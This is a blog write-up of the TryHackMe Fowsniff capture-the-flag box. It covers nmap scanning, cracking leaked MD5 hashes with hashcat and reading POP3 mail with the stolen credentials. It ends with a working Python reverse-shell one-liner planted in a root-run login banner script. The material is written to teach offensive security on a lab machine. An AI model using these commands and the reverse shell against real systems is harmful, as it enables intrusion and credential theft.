---
layout: post
title: TryHackMe | Fowsniff CTF
tags: [ctf, boot2root, beginner]
---

I recently did a classic boot2root box off TryHackMe made by [@berzerk0](https://twitter.com/berzerk0). After completing it, I thought it would be a great opportunity to talk about some 101 level stuff instead of diving into explaining a four-hour-long HackTheBox Hard. Hopefully, this helps answer some questions people might have been too afraid to ask.

-----

### Initial Recon and Some Networking 101

Without breaking down every level of the OSI model here, let's talk about TCP for a second before getting into Nmap commands. The *Transmission Control Protocol* sits between the lower-level physical and IP layers and the higher-level layers. Beyond providing error checking and handling of packets, it also provides a further abstraction of a network connection to an application as well by including a source and destination port in each of its segments. TCP is also a connection-oriented protocol, meaning that a connection must be established between a client and a server before data can be sent.

This connection establishment phase, referred to as the **three-way handshake**, is incredibly important for a lot of Nmap's basic functionality. The three-way handshake first consists of a client sending a TCP packet with a SYN flag to the server. If the target port is open, the server will send a packet back with a SYN/ACK flag. Now with a normal TCP connection like the one your computer makes to communicate with the HTTP server running this website, at this point the client responds back with a packet with a ACK flag in order to establish the connection. The connection at this point then has to be terminated, which involves a separate handshake. 

Nmap's SYN scan avoids this second handshake by having the client respond to the server with a packet with a RST flag. Now if the target port is closed, the server responds to the initial SYN flag with a RST flag. If it's filtered, the server won't respond to the inital SYN at all. Now that we have a basic understanding of TCP and most importantly the connection establishment part of the protocol, let's dive into the fun stuff. 

Like every CTF, the first thing I did after getting my target machine's IP address was run an `nmap` scan. Nmap is a network scanner that allows us to identify hosts, find open ports on hosts, and even find some important characteristics on hosts like operating system or network service details. This is by no means an exhaustive list of nmap's capabilities but for this walkthrough we'll focus on its port discovery and service discovery capabilities. With our target IP, I ran my run this initial (and only) scan:

```bash
> nmap [target-ip] -sV -O
```

Let's break this command down and talk about what I'm actually doing here. Because we haven't specified which type of scan we want to run, by default we are executing a TCP SYN scan against our target against the first 1000 ports. A TCP SYN scan works by sending a TCP packet with the SYN flag set to each port where three outcomes are possible:

* If the port is open, the target host will send a response with the SYN and ACK flags back, which our host will then respond to with a TCP packet with a RST flag. The reason it responds with RST instead of completing the three-way handshake is that because the target host has sent a SYN / ACK response, we know the port is open and we do not want to have to complete another three-way handshake to close the connection. 

* If the port is closed, the target host will respond back with a TCP packet with a RST flag. 

* If the port is filtered, the target host won't respond back with anything, which can mean a lot of things, but usually means the port is behind a firewall or the host is down. 


The `-sV` flag in our command attempts to determine the version of the service running on each open port and the `-O` flag attempts to determine identify what operating system is running on the host. This information can be very valuable when it comes to the later stages of enumeration, exploitation, and even privilege escalation. Building up as much information during the active reconaissance stage helps us down the road when we start the enumeration process and even privilege escalation upon initial access once inside the target. 

Nmap responded back with this scan report: 

```bash
Nmap scan report for [target-ip]
Host is up (0.22s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Port 80 Is Always a Gold Mine (Well Not Really But It's Always Good To Check)


My initial reaction upon seeing the Nmap scan results was to go to my browser and type in the target IP address into the searchbar. Why? Because port 80, a port reserved for http, the protocol that makes most of the seeable Internet just werk, was open with potentially even an Apache http server running. Lo and behold, there was a company website live with a notice, saying that they recently had a data breach and that their company twitter was defaced by some *not-so-nice* hackers.

![Company Website](/assets/fowsniff-ctf-assets/website.png)

After thanking my friends for doing the hard work, I went to their twitter page and found a link to a pastebin with some interesting text files.

![Defaced Company Twitter](/assets/fowsniff-ctf-assets/company-twitter.png)

### Intro to Hashing / Cracking Bad Passwords with hashcat

After glancing at the pastebin, I immediately realized what the text file gave me. It contained the password hashes and usernames of several users on this company network. Let's break down cryptographic hash functions, conceptually and then also through an actual algorithm before busting out the terminal. A cryptographic hash function maps data of arbitary size to a bit array of a fixed size. Because it's a one way function, finding the input of a hash from the output alone usually requires a brute-force search of possible inputs. 

A practical application of this type of function is password verification amongs others. Because the storing of passwords on a system in clear text is a major security flaw, passwords are verified during authentication by comparing the hash of an input to the password hashes stored on the system. One of the popular hash algorithms in use today, despite its numerous vulnerabilities, is MD5. MD5 takes an input of arbitray length and produces an output of 128 bits represented by a sequence of 32 hexadecimal digits. MD5 is considered *cryptographically broken* and in our case, can be cracked in a couple seconds with a relatively small wordlist and good ol `hashcat`, a pretty cool password cracker with some awesome configuration settings.  

Back to our CTF, after seeing this wonderful pastebin of goodies, I copied them into a `txt` file and 
ran this command in my iTerm:
```bash
> hashcat -m 0 -a 0 -o cracked.txt hashes.txt ~/dev/wordlists/rockyou.txt
```

The `-m 0` flag here specifies what type of hash were cracking (in this case MD5) while `-a 0` specifies that we are using a simple wordlist based attack. The `-o cracked.txt` specifies that we are to output the results to a new textfile named `cracked.txt` while the second textfile contains the actual hashes themselves. The third file `rockyou.txt` is the wordlist we are using to bruteforce the passwords. After running the command I got this output of eight recovered passwords:

![Cracked Passwords](/assets/fowsniff-ctf-assets/cracked-hashes.png)

### Enumerating POP3 and Gaining Initial Access

After unsuccesfully trying to login over ssh with the cracked passwords and remembering from my initial nmap scan that the host had a email server up and running, I attempted to connect to the server by typing in `telnet 110` to see if I could get find anything interesting. One of the protocols required for a mail server to function is POP3, which is for clients to retrieve emails from an email server. While your email application usually does this for you, you can actually connect to a server manually to retrieve messages by logging in over telnet and specifying POP3's standard port `110`. Upon setting up a POP3 session, I logged into a couple user mailboxes with the cracked passwords and the `USER` command until I found a mailbox with an interesting email: 

![Email with plaintext ssh password](/assets/fowsniff-ctf-assets/bad-email.png)

Thank you AJ, the most likely overworked sys-admin, for leaving your email server open to the public and keeping an ssh password in plaintext on there.


### From `user` to `root` (Privilege Escalation Basics)

Before we go over the simple privilege escalation trick I used to get a `root` shell, let's go over some basic Linux concepts regarding users, groups, and their respective permissions. With Linux, users are individual accounts with their own file permissions that are tied to groups, which also have their own file permissions. File permissions are based off reading, writing, and executing. The standard format for file and directory permissions starts with a `rwx` block, representing the file permissions for the file owner, a second `rwx` block for the permissions the group owner, and by extension anyone within that group, has, and a final `rwx` block for all other users. If a certain block has a dash in place of a character, the users within that block do not have the permissions to carry out that action. We can use this information to figure out what we can write or run within our group. 

After using the gift above to get a shell on the host, I started doing some basic privilege escalation enumeration to see what privileges I had. After getting information about the operating system itself, I checked what groups I belonged to by running `groups` in my shell. Seeing that I belonged to a `users` group, I then ran the `find` command to find all files that belonged to my group:

```bash
find / -group users -type f  2>/dev/null
```

The first file that appeared was a shell script called `cube.sh` used for printing the login banner. Since I knew the file was writeable from running `ls -l` and I knew that the script was executed as root from a file in `/etc/update-motd.d` I opened up `cube.sh` with `nano` and pasted in a Python reverse shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<myIP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

A *reverse shell* per the name is a shell that is initiated from the remote host instead of the local host. The local host instead listens for incoming network connections on the port specified. One part of reverse shells that are especially helpful is that you can assign common listener ports like 80 or 443 instead of ports that most likely are blocked by firewall. In this case, I used port 1234 as my listener port and ran `ncat -lvp 1234` on my localhost. The final step was executing the shell script we modified. Since that script is run every time a user ssh's onto the target host, I just logged in one more time as my low level user and checked my netcat listener in my other iTerm tab:

![Reverse Shell](/assets/fowsniff-ctf-assets/reverse-shell.png)

*N i c e*.

### Closing Thoughts

Overall, this was a pretty simple box but I'm taking a great web application security workshop by F-Secure right now and wanted to do a detailed writeup for people new to offensive security. I also liked that instead of running searchsploit over and over again it was instead just abusing really bad configurations, which is a lot more realistic to what I find on engagements.


